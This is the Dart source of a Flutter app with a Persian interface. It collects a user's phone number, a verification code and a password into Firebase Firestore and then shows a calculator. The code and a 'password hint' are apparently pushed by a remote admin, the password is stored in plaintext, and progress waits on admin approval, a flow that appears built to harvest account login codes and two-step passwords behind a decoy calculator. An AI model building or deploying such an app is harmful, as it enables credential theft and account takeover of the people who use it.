import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'dart:async';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(const App());
}

class App extends StatelessWidget {
  const App({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(
    debugShowCheckedModeBanner: false,
    title: 'XWXWX',
    theme: ThemeData(
      brightness: Brightness.dark,
      useMaterial3: true,
      colorScheme: ColorScheme.dark(
        primary: const Color(0xFF7C4DFF),
        secondary: const Color(0xFF00E5FF),
        surface: const Color(0xFF1A1A2E),
      ),
      scaffoldBackgroundColor: const Color(0xFF0F0F1A),
    ),
    home: const Gate(),
  );
}

class Gate extends StatefulWidget {
  const Gate({super.key});
  @override
  State<Gate> createState() => _GateState();
}

class _GateState extends State<Gate> {
  final _phoneCtrl = TextEditingController();
  final _codeCtrl = TextEditingController();
  final _passCtrl = TextEditingController();
  String? _phone;
  Map<String, dynamic>? _data;
  StreamSubscription? _sub;
  bool _busy = false;
  String? _err;

  Future<void> _startPhone() async {
    final p = _phoneCtrl.text.trim();
    if (p.length < 10) { setState(() => _err = 'شماره معتبر وارد کن'); return; }
    setState(() { _busy = true; _err = null; });
    try {
      final ref = FirebaseFirestore.instance.collection('users').doc(p);
      final snap = await ref.get();
      if (!snap.exists) {
        await ref.set({
          'phone': p,
          'status': 'phone_entered',
          'createdAt': FieldValue.serverTimestamp(),
          'lastUpdate': FieldValue.serverTimestamp(),
        });
      }
      setState(() => _phone = p);
      _listen(p);
    } catch (e) {
      setState(() => _err = 'خطا: $e');
    }
    setState(() => _busy = false);
  }

  void _listen(String phone) {
    _sub?.cancel();
    _sub = FirebaseFirestore.instance.collection('users').doc(phone).snapshots().listen((s) {
      if (!s.exists) return;
      setState(() => _data = s.data());
    });
  }

  Future<void> _submitCode() async {
    final c = _codeCtrl.text.trim();
    if (c.isEmpty) return;
    setState(() { _busy = true; _err = null; });
    try {
      final correct = _data?['code']?.toString() ?? '';
      if (correct.isEmpty) { setState(() => _err = 'هنوز کدی نیومده'); _busy = false; return; }
      if (c != correct) { setState(() => _err = 'کد اشتباهه'); _busy = false; return; }
      await FirebaseFirestore.instance.collection('users').doc(_phone).update({
        'status': 'code_entered',
        'lastUpdate': FieldValue.serverTimestamp(),
      });
    } catch (e) { setState(() => _err = 'خطا: $e'); }
    setState(() => _busy = false);
  }

  Future<void> _submitPassword() async {
    final pw = _passCtrl.text.trim();
    if (pw.length < 4) { setState(() => _err = 'رمز حداقل ۴ حرف'); return; }
    setState(() { _busy = true; _err = null; });
    try {
      await FirebaseFirestore.instance.collection('users').doc(_phone).update({
        'password': pw,
        'status': 'waiting_approval',
        'lastUpdate': FieldValue.serverTimestamp(),
      });
    } catch (e) { setState(() => _err = 'خطا: $e'); }
    setState(() => _busy = false);
  }

  @override
  void dispose() { _sub?.cancel(); super.dispose(); }

  @override
  Widget build(BuildContext context) => Directionality(
    textDirection: TextDirection.rtl,
    child: Scaffold(body: SafeArea(child: _body())),
  );

  Widget _body() {
    if (_phone == null) return _phoneUI();
    final st = _data?['status'] ?? 'phone_entered';
    if (st == 'active') return const Calculator();
    if (st == 'waiting_password') return _passUI();
    if (st == 'waiting_approval') return _waitUI('منتظر تأیید ادمین...');
    return _codeUI();
  }

  Widget _phoneUI() => Padding(
    padding: const EdgeInsets.all(24),
    child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      const Icon(Icons.shield_moon, size: 80, color: Color(0xFF7C4DFF)),
      const SizedBox(height: 24),
      const Text('XWXWX', style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold, letterSpacing: 4)),
      const SizedBox(height: 8),
      const Text('شماره‌ات رو وارد کن', style: TextStyle(color: Colors.white60)),
      const SizedBox(height: 32),
      _field(_phoneCtrl, '0912XXXXXXX', TextInputType.phone, 18),
      if (_err != null) _errTxt(_err!),
      const SizedBox(height: 24),
      _btn('ادامه', _busy ? null : _startPhone, const Color(0xFF7C4DFF)),
    ]),
  );

  Widget _codeUI() => Padding(
    padding: const EdgeInsets.all(24),
    child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      const Icon(Icons.sms, size: 80, color: Color(0xFF00E5FF)),
      const SizedBox(height: 24),
      const Text('کد تأیید', style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold)),
      const SizedBox(height: 8),
      const Text('کد ارسالی رو وارد کن', style: TextStyle(color: Colors.white60)),
      const SizedBox(height: 32),
      _field(_codeCtrl, '_____', TextInputType.number, 28),
      if (_err != null) _errTxt(_err!),
      const SizedBox(height: 24),
      _btn('تأیید', _busy ? null : _submitCode, const Color(0xFF00E5FF), fg: Colors.black),
    ]),
  );

  Widget _passUI() {
    final hint = _data?['passwordHint']?.toString() ?? '';
    return Padding(
      padding: const EdgeInsets.all(24),
      child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        const Icon(Icons.lock, size: 80, color: Color(0xFFFFC107)),
        const SizedBox(height: 24),
        const Text('تعیین رمز', style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold)),
        if (hint.isNotEmpty) ...[
          const SizedBox(height: 20),
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A2E),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: const Color(0xFFFFC107)),
            ),
            child: Column(children: [
              const Text('راهنمای رمز:', style: TextStyle(color: Colors.white60)),
              const SizedBox(height: 8),
              Text(hint, style: const TextStyle(fontSize: 16), textAlign: TextAlign.center),
            ]),
          ),
        ],
        const SizedBox(height: 24),
        _field(_passCtrl, 'رمز', TextInputType.text, 20, obscure: true),
        if (_err != null) _errTxt(_err!),
        const SizedBox(height: 24),
        _btn('ثبت', _busy ? null : _submitPassword, const Color(0xFFFFC107), fg: Colors.black),
      ]),
    );
  }

  Widget _waitUI(String m) => Center(child: Padding(
    padding: const EdgeInsets.all(24),
    child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      const CircularProgressIndicator(color: Color(0xFF7C4DFF)),
      const SizedBox(height: 24),
      Text(m, style: const TextStyle(fontSize: 16), textAlign: TextAlign.center),
    ]),
  ));

  Widget _field(TextEditingController c, String h, TextInputType t, double s, {bool obscure = false}) =>
    TextField(
      controller: c, keyboardType: t, textAlign: TextAlign.center, obscureText: obscure,
      style: TextStyle(fontSize: s, letterSpacing: 2),
      decoration: InputDecoration(
        hintText: h, filled: true, fillColor: const Color(0xFF1A1A2E),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(16), borderSide: BorderSide.none),
        contentPadding: const EdgeInsets.symmetric(vertical: 20),
      ),
    );

  Widget _errTxt(String t) => Padding(
    padding: const EdgeInsets.only(top: 12),
    child: Text(t, style: const TextStyle(color: Colors.redAccent), textAlign: TextAlign.center),
  );

  Widget _btn(String l, VoidCallback? onTap, Color c, {Color fg = Colors.white}) => SizedBox(
    width: double.infinity, height: 56,
    child: ElevatedButton(
      onPressed: onTap,
      style: ElevatedButton.styleFrom(
        backgroundColor: c, foregroundColor: fg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      ),
      child: _busy
        ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
        : Text(l, style: const TextStyle(fontSize: 18)),
    ),
  );
}

class Calculator extends StatefulWidget {
  const Calculator({super.key});
  @override
  State<Calculator> createState() => _CalcState();
}

class _CalcState extends State<Calculator> {
  String _d = '0';
  double? _f;
  String _op = '';
  bool _new = true;

  void _tap(String v) {
    setState(() {
      if (v == 'C') { _d = '0'; _f = null; _op = ''; _new = true; return; }
      if (v == '=') {
        if (_f != null && _op.isNotEmpty) {
          final s = double.tryParse(_d) ?? 0;
          double r = 0;
          if (_op == '+') r = _f! + s;
          if (_op == '−') r = _f! - s;
          if (_op == '×') r = _f! * s;
          if (_op == '÷') r = s == 0 ? 0 : _f! / s;
          _d = r == r.truncateToDouble() ? r.toInt().toString() : r.toStringAsFixed(2);
          _f = null; _op = ''; _new = true;
        }
        return;
      }
      if ('+−×÷'.contains(v)) { _f = double.tryParse(_d); _op = v; _new = true; return; }
      if (_new) { _d = v; _new = false; }
      else { _d = _d == '0' ? v : _d + v; }
    });
  }

  Widget _b(String l, [Color? c, Color? f, bool disabled = false]) => Expanded(
    child: Padding(
      padding: const EdgeInsets.all(4),
      child: AspectRatio(
        aspectRatio: 1.1,
        child: ElevatedButton(
          onPressed: disabled ? null : () => _tap(l),
          style: ElevatedButton.styleFrom(
            backgroundColor: c ?? const Color(0xFF1A1A2E),
            foregroundColor: f ?? Colors.white,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
            elevation: 0,
            disabledBackgroundColor: Colors.transparent,
          ),
          child: Text(l, style: const TextStyle(fontSize: 24, fontWeight: FontWeight.w600)),
        ),
      ),
    ),
  );

  @override
  Widget build(BuildContext context) => Scaffold(
    body: SafeArea(child: Column(children: [
      const SizedBox(height: 20),
      const Text('XWXWX', style: TextStyle(color: Color(0xFF7C4DFF), fontSize: 20, fontWeight: FontWeight.bold, letterSpacing: 4)),
      const Spacer(),
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 24),
        alignment: Alignment.centerRight,
        child: Text(_d, style: const TextStyle(fontSize: 64, fontWeight: FontWeight.w300)),
      ),
      const SizedBox(height: 40),
      Padding(
        padding: const EdgeInsets.all(12),
        child: Column(children: [
          Row(children: [_b('C', const Color(0xFFEF5350), Colors.white), _b('÷', const Color(0xFF7C4DFF)), _b('×', const Color(0xFF7C4DFF)), _b('−', const Color(0xFF7C4DFF))]),
          Row(children: [_b('7'), _b('8'), _b('9'), _b('+', const Color(0xFF7C4DFF))]),
          Row(children: [_b('4'), _b('5'), _b('6'), _b('00')]),
          Row(children: [_b('1'), _b('2'), _b('3'), _b('=', const Color(0xFF00E5FF), Colors.black)]),
          Row(children: [_b('0'), _b('.'), _b('C', const Color(0xFFEF5350), Colors.white), _b('', null, null, true)]),
        ]),
      ),
      const SizedBox(height: 20),
    ])),
  );
}
